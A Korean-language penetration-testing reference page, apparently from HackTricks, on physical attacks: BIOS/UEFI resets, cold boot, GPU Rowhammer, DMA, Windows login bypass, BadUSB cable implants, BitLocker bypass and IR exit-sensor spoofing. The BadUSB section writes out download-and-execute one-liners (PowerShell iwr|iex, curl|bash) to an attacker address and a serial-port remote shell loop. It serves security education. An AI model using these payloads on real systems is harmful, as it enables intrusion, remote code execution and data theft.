# 물리적 공격

{{#include ../banners/hacktricks-training.md}}

## BIOS Password 복구 및 시스템 보안

**BIOS 재설정**은 여러 방법으로 수행할 수 있습니다. 대부분의 메인보드에는 **배터리**가 포함되어 있으며, 이 배터리를 약 **30분** 동안 제거하면 password를 포함한 BIOS 설정이 재설정됩니다. 또는 **메인보드의 jumper**를 조정하여 특정 pin을 연결하면 이러한 설정을 재설정할 수 있습니다.

하드웨어를 조정할 수 없거나 조정이 실용적이지 않은 경우에는 **software tool**을 사용할 수 있습니다. **Kali Linux**와 같은 배포판의 **Live CD/USB**에서 시스템을 실행하면 **_killCmos_** 및 **_CmosPWD_**와 같은 BIOS password 복구를 지원하는 tool에 액세스할 수 있습니다.

BIOS password를 모르는 경우, password를 **3회** 잘못 입력하면 일반적으로 error code가 표시됩니다. 이 code를 [https://bios-pw.org](https://bios-pw.org)와 같은 웹사이트에서 사용하면 사용할 수 있는 password를 검색할 수 있습니다.

### UEFI 보안

기존 BIOS 대신 **UEFI**를 사용하는 최신 시스템에서는 **chipsec** tool을 사용하여 **Secure Boot** 비활성화를 비롯한 UEFI 설정을 분석하고 수정할 수 있습니다. 다음 command를 사용하여 이를 수행할 수 있습니다:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM 분석 및 Cold Boot Attacks

RAM은 전원이 차단된 후에도 짧은 시간 동안, 일반적으로 **1~2분** 동안 데이터를 유지합니다. 액체 질소와 같은 차가운 물질을 적용하면 이 지속 시간을 **10분**까지 연장할 수 있습니다. 이 연장된 시간 동안 **dd.exe** 및 **volatility**와 같은 도구를 사용해 분석을 위한 **memory dump**를 생성할 수 있습니다.

---

## Page Tables를 대상으로 하는 GPU Rowhammer

최신 GPU Rowhammer 공격은 일반적인 버퍼 대신 **GPU virtual-memory metadata**를 대상으로 할 때 훨씬 더 유용해집니다. **GDDR6 NVIDIA Ampere GPUs**에 대한 최근 연구에 따르면, 권한이 없는 CUDA code를 실행하는 공격자는 GPU별 hammering 패턴을 구축하고, **memory massaging**을 사용해 paging structures를 취약한 row에 배치한 다음, **last-level page table** 또는 중간 **page directory**의 bit를 flip할 수 있습니다. 단일 translation entry가 손상되면 공격자는 **arbitrary GPU memory read/write**를 위한 기반을 마련한 뒤 host compromise로 전환할 수 있습니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Exploitation Pattern

1. GDDR6에서 **hammerable rows**를 프로파일링하고, in-DRAM mitigations를 우회하는 refresh-aware / non-uniform hammering 패턴을 구축합니다.
2. **GPU allocations**를 **massage**하여 driver가 page-translation structures를 기본 보호 pool에 유지하는 대신 hammerable physical locations에 배치하도록 합니다. 실제로는 low-memory page-table region을 고갈시키고, 제어된 stride를 사용하는 대규모 sparse UVM mappings를 spraying하는 방식이 될 수 있습니다.
3. **PFN** 또는 aperture 관련 bit와 같은 **translation metadata**를 page-table / page-directory entry 내부에서 **flip**하여, 공격자가 제어하는 virtual page가 page-table pages, arbitrary GPU memory 또는 host-visible system mappings로 resolve되도록 합니다.
4. 위조된 mapping을 재사용해 추가 translation entries를 다시 작성하고, GPU contexts 전체에서 **arbitrary GPU memory read/write**로 권한을 상승시킵니다.

### Host Pivot 및 Mitigations

- **IOMMU가 비활성화된 경우**, 위조된 system-aperture mappings가 임의의 **host physical memory**를 GPU에 노출할 수 있어 GPU primitive가 full host compromise로 이어질 수 있습니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer**는 last-level page-table entries를 대상으로 하는 반면, **GeForge**는 page-directory level을 손상시키는 편이 더 쉬울 수 있음을 보여줍니다. 하나의 bit flip만으로 더 큰 translation subtree를 다른 대상으로 지정할 수 있기 때문입니다. 하나의 paging layer만 security-critical하다고 간주해서는 안 됩니다.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU**는 GDDRHammer/GeForge가 사용하는 direct arbitrary-host-memory 경로를 차단하므로 여전히 중요하지만, **완전한 mitigation은 아닙니다**. **GPUBreach**는 두 번째 단계의 pivot을 보여줍니다. 공격자가 GPU-writable 및 driver-owned CPU buffers를 손상시킨 다음 NVIDIA driver memory-safety bugs를 trigger하여, IOMMU가 활성화된 상태에서도 kernel write primitive와 **root shell**을 획득하는 방식입니다.<sup>[[3]](#references)</sup>
- 지원되는 workstation/server GPUs에서는 **system-level ECC**가 실용적인 hardening 단계입니다. ECC가 없는 Consumer GPUs는 더 취약한 defense surface를 노출합니다.<sup>[[4]](#references)</sup>
- 이러한 공격은 단순한 이론에 그치지 않습니다. **GeForge**는 RTX 3060에서 **1,171**회의 bit flip을, RTX A6000에서 **202**회의 bit flip을 보고했으며, 이는 동작하는 host-privilege-escalation chain을 구축하기에 충분했습니다.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Direct Memory Access (DMA) Attacks

**INCEPTION**은 **FireWire** 및 **Thunderbolt**와 같은 interfaces와 호환되며, DMA를 통한 **physical memory manipulation**을 위해 설계된 도구입니다. memory를 patch하여 모든 password를 허용하도록 함으로써 login procedures를 우회할 수 있습니다. 그러나 **Windows 10** systems에서는 효과가 없습니다.

---

## System Access를 위한 Live CD/USB

**_sethc.exe_** 또는 **_Utilman.exe_**와 같은 system binaries를 **_cmd.exe_**의 복사본으로 변경하면 system privileges를 가진 command prompt를 제공할 수 있습니다. **chntpw**와 같은 도구를 사용해 Windows installation의 **SAM** file을 편집하고 password를 변경할 수 있습니다.

**Kon-Boot**은 Windows kernel 또는 UEFI를 일시적으로 수정하여 password를 몰라도 Windows systems에 login할 수 있도록 하는 도구입니다. 자세한 내용은 [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/)에서 확인할 수 있습니다.<sup>[[10]](#references)</sup>

---

## Windows Security Features 처리

### Boot 및 Recovery Shortcuts

- **Supr**: BIOS settings에 액세스합니다.
- **F8**: Recovery mode로 진입합니다.
- Windows banner 이후 **Shift**를 누르면 autologon을 우회할 수 있습니다.

### BAD USB Devices

**Rubber Ducky** 및 **Teensyduino**와 같은 devices는 **bad USB** devices를 생성하기 위한 platforms로 사용되며, target computer에 연결될 때 미리 정의된 payloads를 실행할 수 있습니다.

### Volume Shadow Copy

Administrator privileges를 사용하면 PowerShell을 통해 **SAM** file을 포함한 민감한 files의 copies를 생성할 수 있습니다.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- **Evil Crow Cable Wind**와 같은 ESP32-S3 기반 implants는 USB-A→USB-C 또는 USB-C↔USB-C cables 내부에 숨겨지고, USB keyboard로만 enumerate되며, Wi-Fi를 통해 C2 stack을 노출합니다. Operator는 victim host에서 cable에 전원만 공급하고, password가 `123456789`인 `Evil Crow Cable Wind`라는 hotspot을 생성한 뒤 [http://cable-wind.local/](http://cable-wind.local/) (또는 DHCP address)로 이동하여 내장 HTTP interface에 액세스하면 됩니다.<sup>[[8]](#references)</sup>
- Browser UI는 *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* 및 *Config* tabs를 제공합니다. 저장된 payloads에는 OS별 tag가 지정되고, keyboard layouts는 실시간으로 전환되며, VID/PID strings는 알려진 peripherals를 모방하도록 변경할 수 있습니다.
- C2가 cable 내부에 존재하므로 phone을 사용해 payloads를 준비하고, execution을 trigger하며, host OS를 건드리지 않고 Wi-Fi credentials를 관리할 수 있습니다. 이는 짧은 dwell-time을 갖는 physical intrusions에 적합합니다.

### OS-aware AutoExec payloads

- AutoExec rules는 하나 이상의 payloads를 bind하여 USB enumeration 직후 실행되도록 합니다. Implant는 간단한 OS fingerprinting을 수행하고 일치하는 script를 선택합니다.
- Example workflow:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) 또는 `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Execution이 unattended로 수행되므로 charging cable만 교체해도 logged-on user context에서 “plug-and-pwn” initial access를 확보할 수 있습니다.

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 저장된 payload가 console을 열고, 새 USB serial device로 수신되는 모든 내용을 실행하는 loop를 paste합니다. 최소한의 Windows variant는 다음과 같습니다:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** implant는 USB CDC channel을 open 상태로 유지하는 동시에 ESP32-S3에서 operator로 연결되는 TCP client(Python script, Android APK 또는 desktop executable)를 실행합니다. TCP session에 입력된 모든 bytes는 위의 serial loop로 전달되므로, air-gapped hosts에서도 remote command execution이 가능합니다. Output은 제한적이므로 operator는 일반적으로 blind commands(account creation, 추가 tooling staging 등)를 실행합니다.

### HTTP OTA update surface

- 동일한 web stack은 대개 unauthenticated firmware updates도 노출합니다. Evil Crow Cable Wind는 `/update`에서 수신 대기하며, upload된 모든 binary를 flash합니다:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- 현장 operator는 케이블을 열지 않고도 engagement 중에 기능을 hot-swap할 수 있습니다(예: flash USB Army Knife firmware). 이를 통해 implant가 대상 host에 계속 연결된 상태에서 새로운 기능으로 전환할 수 있습니다.

## BitLocker Encryption 우회

메모리 dump 파일(**MEMORY.DMP**)에서 **recovery password**를 찾으면 BitLocker encryption을 잠재적으로 우회할 수 있습니다. 이를 위해 **Elcomsoft Forensic Disk Decryptor** 또는 **Passware Kit Forensic**과 같은 도구를 사용할 수 있습니다.

---

## Recovery Key 추가를 위한 Social Engineering

사용자가 새로운 recovery key를 추가하는 명령을 실행하도록 설득하는 Social Engineering tactics를 통해 새로운 BitLocker recovery key를 추가할 수 있습니다. 이 key는 0으로 구성되므로 decryption 과정이 단순해집니다.

---

## Chassis Intrusion / Maintenance Switch를 악용한 BIOS Factory Reset

많은 최신 laptop과 소형 form-factor desktop에는 Embedded Controller (EC)와 BIOS/UEFI firmware가 모니터링하는 **chassis-intrusion switch**가 포함되어 있습니다. 이 switch의 주된 목적은 device가 열릴 때 alert를 발생시키는 것이지만, 일부 vendor는 switch가 특정 패턴으로 전환될 때 작동하는 **undocumented recovery shortcut**을 구현하기도 합니다.<sup>[[5]](#references)[[6]](#references)</sup>

### Attack 작동 방식

1. 이 switch는 EC의 **GPIO interrupt**에 연결되어 있습니다.
2. EC에서 실행되는 firmware는 **press의 timing과 횟수**를 추적합니다.
3. hard-coded pattern이 인식되면 EC는 *mainboard-reset* routine을 호출하여 system NVRAM/CMOS의 **내용을 삭제**합니다.
4. 다음 boot 시 BIOS는 default 값을 불러옵니다. **supervisor password, Secure Boot keys 및 모든 custom configuration이 삭제됩니다.**

> Secure Boot가 비활성화되고 firmware password가 제거되면, attacker는 외부 OS image를 boot하여 internal drive에 unrestricted access를 얻을 수 있습니다.

### 실제 사례 – Framework 13 Laptop

Framework 13 (11th/12th/13th-gen)의 recovery shortcut은 다음과 같습니다.
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
열 번째 cycle 후 EC는 다음 reboot 시 BIOS가 NVRAM을 wipe하도록 지시하는 flag를 설정합니다. 전체 절차에는 약 40초가 걸리며 **드라이버 하나만 필요합니다**.<sup>[[5]](#references)</sup>

### 일반적인 Exploitation 절차

1. EC가 실행 중이 되도록 target의 전원을 켜거나 suspend-resume을 수행합니다.
2. intrusion/maintenance switch를 노출시키기 위해 하단 커버를 제거합니다.
3. vendor별 toggle pattern을 재현합니다(문서, forum을 참고하거나 EC firmware를 reverse-engineer합니다).
4. 다시 조립하고 reboot합니다. firmware protection이 비활성화되어야 합니다.
5. live USB(예: Kali Linux)로 boot한 뒤 일반적인 post-exploitation을 수행합니다(credential dumping, data exfiltration, 악성 EFI binary implant 등).

### Detection & Mitigation

* OS management console에 chassis-intrusion event를 기록하고 예상치 못한 BIOS reset과 상관 분석합니다.
* 나사/커버의 개봉을 감지할 수 있도록 **tamper-evident seal**을 사용합니다.
* 장치를 **물리적으로 통제되는 구역**에 보관합니다. physical access는 full compromise와 같다고 가정해야 합니다.
* 가능한 경우 vendor의 “maintenance switch reset” feature를 비활성화하거나 NVRAM reset에 추가적인 cryptographic authorisation을 요구합니다.

---

## No-Touch Exit Sensor에 대한 은밀한 IR Injection

### Sensor 특성
- 상용 “wave-to-exit” sensor는 near-IR LED emitter와 TV remote 스타일의 receiver module을 pair로 사용하며, 올바른 carrier(약 30 kHz)의 pulse를 여러 번(약 4~10회) 감지한 후에만 logic high를 보고합니다.<sup>[[7]](#references)</sup>
- Plastic shroud는 emitter와 receiver가 서로를 직접 바라보지 못하게 차단하므로, controller는 검증된 carrier가 근처의 reflection에서 발생했다고 판단하고 door strike를 여는 relay를 구동합니다.
- Controller가 target의 존재를 인식하면 outbound modulation envelope를 변경하는 경우가 많지만, receiver는 filtering된 carrier와 일치하는 모든 burst를 계속 수락합니다.

### Attack Workflow
1. **Emission profile 캡처** – controller pin에 logic analyser를 연결하여 internal IR LED를 구동하는 pre-detection 및 post-detection waveform을 모두 기록합니다.
2. **“Post-detection” waveform만 replay** – 기본 emitter를 제거하거나 무시하고, 처음부터 이미 trigger된 pattern으로 external IR LED를 구동합니다. Receiver는 pulse count/frequency만 확인하므로 spoof된 carrier를 실제 reflection으로 처리하고 relay line을 assert합니다.
3. **Transmission gate 설정** – carrier를 조정된 burst(예: 수십 밀리초 동안 on, 비슷한 시간 동안 off)로 전송하여 receiver의 AGC 또는 interference handling logic을 포화시키지 않으면서 필요한 최소 pulse count를 전달합니다. Continuous emission은 sensor의 감도를 빠르게 떨어뜨려 relay가 작동하지 않게 합니다.

### Long-Range Reflective Injection
- Bench LED를 high-power IR diode, MOSFET driver 및 focusing optics로 교체하면 약 6 m 거리에서 안정적인 triggering이 가능합니다.
- Attacker는 receiver aperture와 line-of-sight를 확보할 필요가 없습니다. 유리를 통해 보이는 실내 벽, 선반 또는 door frame에 beam을 조준하면 reflection된 energy가 약 30° field of view 안으로 들어가 근거리 hand wave를 모방합니다.
- Receiver는 약한 reflection만을 예상하므로 훨씬 강한 external beam도 여러 surface에서 bounce된 뒤 detection threshold를 초과한 상태로 유지될 수 있습니다.

### Weaponised Attack Torch
- Driver를 상용 flashlight 내부에 내장하면 도구를 평범한 물건처럼 숨길 수 있습니다. Visible LED를 receiver의 band에 맞는 high-power IR LED로 교체하고, ATtiny412(또는 유사한 MCU)를 추가하여 약 30 kHz burst를 생성하며, MOSFET을 사용해 LED current를 sink합니다.
- Telescopic zoom lens는 range/precision을 위해 beam을 집중시키고, MCU 제어 하의 vibration motor는 visible light를 방출하지 않고 modulation이 활성화되었음을 haptic feedback으로 알려줍니다.
- 여러 저장된 modulation pattern(서로 조금씩 다른 carrier frequency 및 envelope)을 순환하면 rebranded sensor family 간 호환성이 향상됩니다. 이를 통해 operator는 relay가 audible하게 click하고 door가 열릴 때까지 reflective surface를 차례로 조준할 수 있습니다.

---

## References

- [1] [GDDRHammer: Greatly Disturbing DRAM Rows — Cross-Component Rowhammer Attacks from Modern GPUs](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Hammering GDDR Memory to Forge GPU Page Tables for Fun and Profit](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Privilege Escalation Attacks on GPUs using Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Security Notice: Rowhammer - July 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer Attack Against NVIDIA Chips](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [raymond.cc - Login To Windows Administrator And Linux Root Account Without Knowing Or Changing Current Password](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password)

{{#include ../banners/hacktricks-training.md}}
